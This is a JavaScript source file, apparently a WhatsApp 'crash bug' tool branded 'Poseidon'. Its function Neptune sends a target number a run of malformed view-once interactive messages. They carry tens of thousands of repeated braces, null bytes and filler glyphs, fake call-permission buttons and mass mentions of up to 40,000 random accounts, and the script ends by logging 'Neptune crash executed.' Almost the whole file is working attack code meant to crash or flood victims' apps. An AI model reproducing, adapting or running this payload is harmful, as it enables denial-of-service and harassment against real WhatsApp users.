const Poseidon = JSON.stringify({
  status: true,
  criador: "PoseidonApiBug",
  resultado: {
    type: "md",
    ws: {
      _events: { "CB:ib,,dirty": ["Array"] },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

const Node = [{ tag: "bot", attrs: { biz_bot: "1" } }];

async function Neptune(sock, target, mention) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  const Poseidon = JSON.stringify({
    status: true,
    active: true,
    messageParamsJson: "{".repeat(10000),
    call_permission_request: { status: true, enabled: true, version: 3 },
    buttons: [
      {
        name: "nested_crash",
        buttonParamsJson: JSON.stringify({
          messageParamsJson: "{".repeat(15000),
          crash: true,
          overdrive: true,
        }),
      },
      {
        name: "multi_repeat",
        buttonParamsJson: JSON.stringify({
          status: true,
          payload: Array.from({ length: 100 }, () => "{".repeat(50)),
          cameraAccess: true
        }),
      },
    ],
    flood: Array.from({ length: 1000 }, () => ({
      nulls: "\u0000".repeat(100),
      emojis: "🇷🇺".repeat(20),
      status: true,
    })),
  });

  const puqi = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [{
              header: {
                title: '𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺',
                imageMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/...",
                  mimetype: "image/jpeg",
                  fileLength: "178006"
                },
                hasMediaAttachment: true
              },
              body: { text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺" + "ꦽ".repeat(100000) },
              footer: { text: "xnxx.clouds" },
              nativeFlowMessage: { messageParamsJson: "\n".repeat(10000) }
            }]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "Sent", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ xnxx.clouds }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, puqi.message, { messageId: puqi.key.id });

  const brutalMsg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: " 𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝐅𝐨𝐫𝐜𝐞𝐜𝐥𝐨𝐬𝐞 🕊️ ", hasMediaAttachment: false },
          body: { text: " 𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺 " + "\u0000".repeat(30000), format: "DEFAULT" },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(15000),
            buttons: [
              { name: "single_select", buttonParamsJson: Poseidon },
              ...Array.from({ length: 4 }, () => ({
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, enabled: true, overload: true, cameraAccess: true })
              }))
            ]
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, brutalMsg.message, { messageId: brutalMsg.key.id });

  for (let x = 0; x < 3; x++) {
    const echo = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            footer: { text: "🩸⃟𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧 | 𝐈͢𝐧͡𝐯͜𝐢͢𝐜͜𝐭͡𝐮͢𝐬 • 🩸" },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(9999),
              buttons: [
                { name: 'single_select', buttonParamsJson: '\u0000' + Poseidon },
                { name: 'mpm', buttonParamsJson: '{}'.repeat(1000) + Poseidon },
                { name: 'call_permission_request', buttonParamsJson: '{}' }
              ]
            },
            contextInfo: {
              mentionedJid: [target, ...Array.from({ length: 8000 }, () =>
                "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")]
            }
          }
        }
      }
    }, {});
    await sock.relayMessage(target, echo.message, { messageId: echo.key.id });
    await sleep(1500);
  }

  const suki = {
    key: { remoteJid: target, fromMe: false, id: generateMessageID() },
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐗-𝐂𝐨𝐫𝐞 🇷🇺", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              version: 3,
              paramsJson: JSON.stringify({
                trigger: true,
                action: "call_crash",
                filler: "꧔".repeat(50000)
              })
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, suki.message, { messageId: suki.key.id });

  if (mention) {
    const mentionedList = ["0@s.whatsapp.net", ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`)];

    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/example",
            mimetype: "image/jpeg",
            caption: "Poseidon Mass Mention",
            contextInfo: {
              mentionedJid: mentionedList,
              isForwarded: true
            }
          }
        }
      }
    }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
  }

  console.log(chalk.red("✅ Neptune crash executed."));
}